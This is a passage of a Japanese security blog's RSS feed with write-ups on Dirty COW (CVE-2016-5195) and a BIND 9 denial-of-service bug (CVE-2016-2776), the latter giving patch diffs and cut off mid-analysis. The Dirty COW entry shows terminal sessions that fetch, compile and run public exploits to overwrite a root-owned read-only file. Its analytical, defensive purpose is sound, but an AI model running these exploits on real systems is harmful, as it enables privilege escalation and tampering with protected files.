&lt;ul&gt;
  &lt;li&gt;http://www.pawelko.net/compiling-rpcapd-for-linux/&lt;/li&gt;
  &lt;li&gt;https://www.wireshark.org/docs/wsug_html_chunked/ChCapInterfaceRemoteSection.html&lt;/li&gt;
  &lt;li&gt;http://www.commandlinefu.com/commands/view/4373/analyze-traffic-remotely-over-ssh-w-wireshark&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Mon, 07 Nov 2016 14:50:00 +0900</pubDate>
        <link>https://kosukeshimofuji.jp/2016/11/07/remote-wireshark/</link>
        <guid isPermaLink="true">https://kosukeshimofuji.jp/2016/11/07/remote-wireshark/</guid>
        
        
        <category>Development</category>
        
      </item>
    
      <item>
        <title>CVE-2016-5195 - Dirty Cow</title>
        <description>&lt;h1 id=&quot;cve-2016-5195&quot;&gt;CVE-2016-5195&lt;/h1&gt;

&lt;h2 id=&quot;section&quot;&gt;概要&lt;/h2&gt;

&lt;p&gt;本脆弱性は適切なアクセス権が設定されていない変更を防ぐことになる標準許可メカニズムをバイパスして、書き込み権限のないファイルに対しての書き込みをローカルシステムアカウントを用いて可能にします。 これは、メモリ内の実行可能mmapのページを有し、かつmadvise（MADV_DONTNEED）システムコールをレースすることによって達成されます。
すべてのローカルユーザーが読むことができる任意のファイルに書き込むことができます。&lt;/p&gt;

&lt;h2 id=&quot;cvss-v3&quot;&gt;CVSS v3&lt;/h2&gt;

&lt;p&gt;2016/10/24日時点でNVDには未公開&lt;/p&gt;

&lt;h2 id=&quot;section-1&quot;&gt;解決策、緩和策情報&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Kernelのupdate&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c13&quot;&gt;緩和策&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;section-2&quot;&gt;影響を受けるソフトウェアとバージョン&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Linux Kernel 2.6.22 - 2016年10月18日より前に出たkernel&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;redhat、centosには脆弱なversionを特定するためのスクリプトが存在します。このスクリプトはredhat,centosの標準的なカーネルを精査することはできますが、独自でビルドしたカーネルについては検出することができません。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;https://access.redhat.com/security/vulnerabilities/2706661&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;section-3&quot;&gt;技術的な詳細&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://git.kernel.org/cgit/linux/kernel/git/stable/linux-stable.git/commit/?id=89eeba1594ac641a30b91942961e80fae978f839&quot;&gt;修正コミット&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;debian-86-jessie&quot;&gt;debian 8.6 jessie&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;dirtyc0w exploit&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kosuke@CVE-2016-5195 ~ $ lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 8.6 (jessie)
Release:        8.6
Codename:       jessie
kosuke@CVE-2016-5195 ~ $ sudo -s
root@CVE-2016-5195:/home/kosuke# echo this is not a test &amp;gt; foo
root@CVE-2016-5195:/home/kosuke# chmod 0404 foo
root@CVE-2016-5195:/home/kosuke# exit
exit
kosuke@CVE-2016-5195 ~ $  ls -lah foo
-r-----r-- 1 root root 19 10月 21 16:28 foo
kosuke@CVE-2016-5195 ~ $ cat foo
this is not a test
kosuke@CVE-2016-5195 ~ $  gcc -lpthread dirtyc0w.c -o dirtyc0w
kosuke@CVE-2016-5195 ~ $ ./dirtyc0w foo m00000000000000000
mmap 7c6cb000

madvise 0

procselfmem 1800000000

kosuke@CVE-2016-5195 ~ $ cat foo
m00000000000000000
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;pokemon exploit&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kosuke@CVE-2016-5195 ~ $ wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c
kosuke@CVE-2016-5195 ~ $ echo pikachu|sudo tee pokeball;ls -l pokeball;gcc -pthread pokemon.c -o d;./d pokeball miltank;cat pokeball
pikachu
-rw-r--r-- 1 root root 8 10月 24 10:13 pokeball
pokeball
   (___)
   (o o)_____/
    @@ `     \
     \ ____, /miltank
     //    //
    ^^    ^^
mmap bbc02000

madvise 0

ptrace 0

miltank

kosuke@CVE-2016-5195 ~ $ cat pokeball
miltank
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;section-4&quot;&gt;追跡が必要な情報源&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.kb.cert.org/vuls/byid?query=CVE-2016-5195&amp;amp;searchview=&quot;&gt;CERT&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://security-tracker.debian.org/tracker/CVE-2016-5195&quot;&gt;Debian&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/search?q=&amp;quot;CVE-2016-5195&amp;quot;&quot;&gt;Github&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://lwn.net/Search/DoSearch?words=CVE-2016-5195&quot;&gt;LWN&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-5195&quot;&gt;NVD&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://packetstormsecurity.com/search/?q=CVE-2016-5195&quot;&gt;PacketStorm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/CVE-2016-5195&quot;&gt;Redhat&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://people.canonical.com/~ubuntu-security/cve/CVE-2016-5195.html&quot;&gt;Ubuntu&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-5195&amp;amp;l=bugtraq&quot;&gt;bugtraq&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-5195&quot;&gt;bugzilla&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.centos.org/forums/search.php?keywords=CVE-2016-5195&quot;&gt;centos&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.cvedetails.com/cve/CVE-2016-5195/&quot;&gt;cvedetail&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/search/?action=search&amp;amp;cve=2016-5195&quot;&gt;exploitdb&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-5195&amp;amp;l=full-disclosure&quot;&gt;fulldisc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rapid7.com/db/search?q=CVE-2016-5195&quot;&gt;metasploit&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://marc.info/?s=CVE-2016-5195&amp;amp;l=oss-security&quot;&gt;oss-sec&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://twitter.com/search?q=CVE-2016-5195&quot;&gt;twitter&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;section-5&quot;&gt;参考文献&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;http://dirtycow.ninja/&lt;/li&gt;
  &lt;li&gt;https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c&lt;/li&gt;
  &lt;li&gt;http://news.softpedia.com/news/linux-kernel-zero-day-cve-2016-5195-patched-after-being-deployed-in-live-attacks-509494.shtml?utm_content=buffere34c2&amp;amp;utm_medium=social&amp;amp;utm_source=linkedin.com&amp;amp;utm_campaign=buffer&lt;/li&gt;
  &lt;li&gt;https://twitter.com/DirtyCOWVuln&lt;/li&gt;
  &lt;li&gt;https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails&lt;/li&gt;
  &lt;li&gt;http://www.cyberciti.biz/faq/dirtycow-linux-cve-2016-5195-kernel-local-privilege-escalation-vulnerability-fix/&lt;/li&gt;
  &lt;li&gt;https://linuxjm.osdn.jp/html/LDP_man-pages/man2/madvise.2.html&lt;/li&gt;
  &lt;li&gt;http://www.nminoru.jp/~nminoru/programming/view_process_mem.html&lt;/li&gt;
  &lt;li&gt;https://git.kernel.org/cgit/linux/kernel/git/stable/linux-stable.git/commit/?id=89eeba1594ac641a30b91942961e80fae978f839&lt;/li&gt;
  &lt;li&gt;https://linuxjm.osdn.jp/html/LDP_man-pages/man2/lseek.2.html&lt;/li&gt;
  &lt;li&gt;http://www.cyberciti.biz/faq/dirtycow-linux-cve-2016-5195-kernel-local-privilege-escalation-vulnerability-fix/&lt;/li&gt;
  &lt;li&gt;https://linuxjm.osdn.jp/html/LDP_man-pages/man2/mmap.2.html&lt;/li&gt;
  &lt;li&gt;https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c&lt;/li&gt;
  &lt;li&gt;http://japan.zdnet.com/article/35090987/&lt;/li&gt;
  &lt;li&gt;http://www.theregister.co.uk/2016/10/21/linux_privilege_escalation_hole/&lt;/li&gt;
  &lt;li&gt;https://github.com/rapid7/metasploit-framework/pull/7476&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Fri, 21 Oct 2016 12:00:00 +0900</pubDate>
        <link>https://kosukeshimofuji.jp/2016/10/21/CVE-2016-5195/</link>
        <guid isPermaLink="true">https://kosukeshimofuji.jp/2016/10/21/CVE-2016-5195/</guid>
        
        
        <category>vlunerability</category>
        
      </item>
    
      <item>
        <title>CVE-2016-2776 - BIND 9.xの脆弱性（DNSサービスの停止）</title>
        <description>&lt;h1 id=&quot;cve-2016-2776&quot;&gt;CVE-2016-2776&lt;/h1&gt;

&lt;h2 id=&quot;section&quot;&gt;概要&lt;/h2&gt;

&lt;p&gt;以下JPRSの&lt;a href=&quot;https://jprs.jp/tech/security/2016-09-28-bind9-vuln-rendering.html&quot;&gt;アドバイザリ&lt;/a&gt;より抜粋&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BIND 9.xにはDNS応答を作成する処理に不具合があり、特定の問い合わせに
対応する応答メッセージをパケットに構築する際、namedが異常終了を起こ
す障害が発生します（*1）。

（*1）本脆弱性によりnamedが異常終了した場合、buffer.cにおいて
      assertion failureを引き起こした旨のメッセージがログに出力され
      ます。

本脆弱性により、DNSサービスの停止が発生する可能性があります。また、
本脆弱性を利用した攻撃はリモートから可能です。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;cvss-v3&quot;&gt;CVSS v3&lt;/h2&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;CVSS v3 Base Score&lt;/td&gt;
      &lt;td&gt;7.5 High&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Vector&lt;/td&gt;
      &lt;td&gt;CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Impact Score&lt;/td&gt;
      &lt;td&gt;3.6&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Exploitability Score&lt;/td&gt;
      &lt;td&gt;3.9&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Attack Vector (AV)&lt;/td&gt;
      &lt;td&gt;Network&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Attack Complexity (AC)&lt;/td&gt;
      &lt;td&gt;Low&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Privileges Required (PR)&lt;/td&gt;
      &lt;td&gt;None&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;User Interaction (UI)&lt;/td&gt;
      &lt;td&gt;None&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Scope (S)&lt;/td&gt;
      &lt;td&gt;Unchanged&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Confidentiality (C)&lt;/td&gt;
      &lt;td&gt;None&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Integrity (I)&lt;/td&gt;
      &lt;td&gt;None&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Availability (A)&lt;/td&gt;
      &lt;td&gt;High&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;section-1&quot;&gt;解決策、緩和策情報&lt;/h2&gt;

&lt;p&gt;BIND 9.10.4-P3/9.9.9-P3へのアップグレードを行ってください。
なお、ISCでは9.8以前の系列のBIND 9のサポートを終了しており、これらの バージョンに対するセキュリティパッチはリリースしないと発表しています。&lt;/p&gt;

&lt;h2 id=&quot;section-2&quot;&gt;影響を受けるソフトウェアとバージョン&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;9.11系列：9.11.0a1～9.11.0rc1&lt;/li&gt;
  &lt;li&gt;9.10系列：9.10.0～9.10.4-P2&lt;/li&gt;
  &lt;li&gt;9.9系列：9.9.0～9.9.9-P2&lt;/li&gt;
  &lt;li&gt;上記以外の系列：9.0.x～9.8.x&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;section-3&quot;&gt;技術的な詳細&lt;/h2&gt;

&lt;h3 id=&quot;section-4&quot;&gt;パッチ内容を確認する&lt;/h3&gt;

&lt;p&gt;ここではすべての修正を列挙することはせずに重要だと思われるコードについてのみ抜粋する。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;脆弱なパッケージと修正済みパッケージをダウンロードする&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ wget https://ftp.isc.org/isc/bind9/9.10.4-P2/bind-9.10.4-P2.tar.gz
$ wget https://ftp.isc.org/isc/bind9/9.10.4-P3/bind-9.10.4-P3.tar.gz
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;差分を閲覧する&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ diff -ur bind-9.10.4-P2 bind-9.10.4-P3
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;CHANGESの差分&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;P3のセキュリティパッチには2つのissueが含まれていることがわかる。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gd&quot;&gt;--- bind-9.10.4-P2/CHANGES      2016-07-14 08:58:03.000000000 +0900
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ bind-9.10.4-P3/CHANGES      2016-09-14 10:23:44.000000000 +0900
&lt;/span&gt;&lt;span class=&quot;gu&quot;&gt;@@ -1,3 +1,15 @@
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+       --- 9.10.4-P3 released ---
+
+4468.  [bug]           Address ECS option handling issues. [RT #43191]
+
+                       Note: Only the parts required to restore
+                       interoperation with ECS clients have been
+                       included in this security release.  The full
+                       fix is included in BIND 9.10.5.
+
+4467.  [security]      It was possible to trigger a assertion when rendering
+                       a message. (CVE-2016-2776) [RT #43139]
+
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;message.c&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;diff -ur bind-9.10.4-P2/lib/dns/message.c bind-9.10.4-P3/lib/dns/message.c
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- bind-9.10.4-P2/lib/dns/message.c    2016-07-14 08:58:03.000000000 +0900
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ bind-9.10.4-P3/lib/dns/message.c    2016-09-14 10:23:44.000000000 +0900
&lt;/span&gt;&lt;span class=&quot;gu&quot;&gt;@@ -1728,7 +1728,7 @@
&lt;/span&gt;        if (r.length &amp;lt; DNS_MESSAGE_HEADERLEN)
                return (ISC_R_NOSPACE);

&lt;span class=&quot;gd&quot;&gt;-       if (r.length &amp;lt; msg-&amp;gt;reserved)
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+       if (r.length - DNS_MESSAGE_HEADERLEN &amp;lt; msg-&amp;gt;reserved)
&lt;/span&gt;                return (ISC_R_NOSPACE);

        /*
&lt;span class=&quot;gu&quot;&gt;@@ -1869,8 +1869,29 @@
&lt;/span&gt;
        return (ISC_TRUE);
 }
&lt;span class=&quot;gd&quot;&gt;-
&lt;/span&gt; #endif
&lt;span class=&quot;gi&quot;&gt;+
+static isc_result_t
+renderset(dns_rdataset_t *rdataset, dns_name_t *owner_name,
+         dns_compress_t *cctx, isc_buffer_t *target,
+         unsigned int reserved, unsigned int options, unsigned int *countp)
+{
+       isc_result_t result;
+
+       /*
+        * Shrink the space in the buffer by the reserved amount.
+        */
+       if (target-&amp;gt;length - target-&amp;gt;used &amp;lt; reserved)
+               return (ISC_R_NOSPACE);
+
+       target-&amp;gt;length -= reserved;
+       result = dns_rdataset_towire(rdataset, owner_name,
+                                    cctx, target, options, countp);
+       target-&amp;gt;length += reserved;
+
+       return (result);
+}
+
&lt;/span&gt; isc_result_t
 dns_message_rendersection(dns_message_t *msg, dns_section_t sectionid,
                          unsigned int options)
&lt;span class=&quot;gu&quot;&gt;@@ -1913,6 +1934,8 @@
&lt;/span&gt;        /*
         * Shrink the space in the buffer by the reserved amount.
         */
&lt;span class=&quot;gi&quot;&gt;+       if (msg-&amp;gt;buffer-&amp;gt;length - msg-&amp;gt;buffer-&amp;gt;used &amp;lt; msg-&amp;gt;reserved)
+               return (ISC_R_NOSPACE);
&lt;/span&gt;        msg-&amp;gt;buffer-&amp;gt;length -= msg-&amp;gt;reserved;

        total = 0;
&lt;span class=&quot;gu&quot;&gt;@@ -2188,9 +2211,8 @@
&lt;/span&gt;                 * Render.
                 */
                count = 0;
&lt;span class=&quot;gd&quot;&gt;-               result = dns_rdataset_towire(msg-&amp;gt;opt, dns_rootname,
-                                            msg-&amp;gt;cctx, msg-&amp;gt;buffer, 0,
-                                            &amp;amp;count);
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+               result = renderset(msg-&amp;gt;opt, dns_rootname, msg-&amp;gt;cctx,
+                                  msg-&amp;gt;buffer, msg-&amp;gt;reserved, 0, &amp;amp;count);
&lt;/span&gt;                msg-&amp;gt;counts[DNS_SECTION_ADDITIONAL] += count;
                if (result != ISC_R_SUCCESS)
                        return (result);
&lt;span class=&quot;gu&quot;&gt;@@ -2206,9 +2228,8 @@
&lt;/span&gt;                if (result != ISC_R_SUCCESS)
                        return (result);
                count = 0;
&lt;span class=&quot;gd&quot;&gt;-               result = dns_rdataset_towire(msg-&amp;gt;tsig, msg-&amp;gt;tsigname,
-                                            msg-&amp;gt;cctx, msg-&amp;gt;buffer, 0,
-                                            &amp;amp;count);
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+               result = renderset(msg-&amp;gt;tsig, msg-&amp;gt;tsigname, msg-&amp;gt;cctx,
+                                  msg-&amp;gt;buffer, msg-&amp;gt;reserved, 0, &amp;amp;count);
&lt;/span&gt;                msg-&amp;gt;counts[DNS_SECTION_ADDITIONAL] += count;
                if (result != ISC_R_SUCCESS)
                        return (result);
&lt;span class=&quot;gu&quot;&gt;@@ -2229,9 +2250,8 @@
&lt;/span&gt;                 * the owner name of a SIG(0) is irrelevant, and will not
                 * be set in a message being rendered.
                 */
&lt;span class=&quot;gd&quot;&gt;-               result = dns_rdataset_towire(msg-&amp;gt;sig0, dns_rootname,
-                                            msg-&amp;gt;cctx, msg-&amp;gt;buffer, 0,
-                                            &amp;amp;count);
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+               result = renderset(msg-&amp;gt;sig0, dns_rootname, msg-&amp;gt;cctx,
+                                  msg-&amp;gt;buffer, msg-&amp;gt;reserved, 0, &amp;amp;count);
&lt;/span&gt;                msg-&amp;gt;counts[DNS_SECTION_ADDITIONAL] += count;
                if (result != ISC_R_SUCCESS)
                        return (result);

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;opt_41.c&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;diff -ur bind-9.10.4-P2/lib/dns/rdata/generic/opt_41.c bind-9.10.4-P3/lib/dns/rdata/generic/opt_41.c
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- bind-9.10.4-P2/lib/dns/rdata/generic/opt_41.c       2016-07-14 08:58:03.000000000 +0900
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ bind-9.10.4-P3/lib/dns/rdata/generic/opt_41.c       2016-09-14 10:23:44.000000000 +0900
&lt;/span&gt;&lt;span class=&quot;gu&quot;&gt;@@ -134,9 +134,6 @@
&lt;/span&gt;                        scope = uint8_fromregion(&amp;amp;sregion);
                        isc_region_consume(&amp;amp;sregion, 1);

&lt;span class=&quot;gd&quot;&gt;-                       if (addrlen == 0U &amp;amp;&amp;amp; family != 0U)
-                               return (DNS_R_OPTERR);
-
&lt;/span&gt;                        switch (family) {
                        case 0:
                                /*
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;rdata_test.c&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gh&quot;&gt;diff -ur bind-9.10.4-P2/lib/dns/tests/rdata_test.c bind-9.10.4-P3/lib/dns/tests/rdata_test.c
&lt;/span&gt;&lt;span class=&quot;gd&quot;&gt;--- bind-9.10.4-P2/lib/dns/tests/rdata_test.c   2016-07-14 08:58:03.000000000 +0900
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ bind-9.10.4-P3/lib/dns/tests/rdata_test.c   2016-09-14 10:23:44.000000000 +0900
&lt;/span&gt;&lt;span class=&quot;gu&quot;&gt;@@ -105,7 +105,7 @@
&lt;/span&gt;                          0x00, 0x08, 0x00, 0x04,
                          0x00, 0x01, 0x00, 0x00
                        },
&lt;span class=&quot;gd&quot;&gt;-                       8, ISC_FALSE
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+                       8, ISC_TRUE
&lt;/span&gt;                },
                {
                        /* Option code family 2 (ipv6) , source 0, scope 0 */
&lt;span class=&quot;gu&quot;&gt;@@ -113,7 +113,7 @@
&lt;/span&gt;                          0x00, 0x08, 0x00, 0x04,
                          0x00, 0x02, 0x00, 0x00
                        },
&lt;span class=&quot;gd&quot;&gt;-                       8, ISC_FALSE
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+                       8, ISC_TRUE
&lt;/span&gt;                },
                {
                        /* extra octet */
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;section-5&quot;&gt;脆弱性を発現させるトリガーを特定する&lt;/h3&gt;

&lt;p&gt;本脆弱性を突かれた場合、buffer.cにおいてassertion failureを引き起こした旨のメッセージがログに出力されるとのことなので、buffer.cを眺めてみる。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2016/09/29/buffer_function.png&quot; alt=&quot;buffer_function&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最終的にこれらの関数のいづれかからassertを発生させることができると推測する。
主に修正されているのはmessage.cのdns_rdataset_towire関数関連の処理である。
dns_rdastaset_towire関数はmessage.cのdns_message_renderend関数内で呼ばれているが、セキュリティパッチによりこれらの呼び出しは全て新たに追加されたrenderset関数に置き換えられている。&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isc_result_t&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;renderset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dns_rdataset_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rdataset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dns_name_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;owner_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;dns_compress_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cctx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isc_buffer_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
         &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reserved&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;countp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
       &lt;span class=&quot;n&quot;&gt;isc_result_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

       &lt;span class=&quot;cm&quot;&gt;/*
        * Shrink the space in the buffer by the reserved amount.
        */&lt;/span&gt;
       &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;used&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reserved&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
               &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ISC_R_NOSPACE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

       &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reserved&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
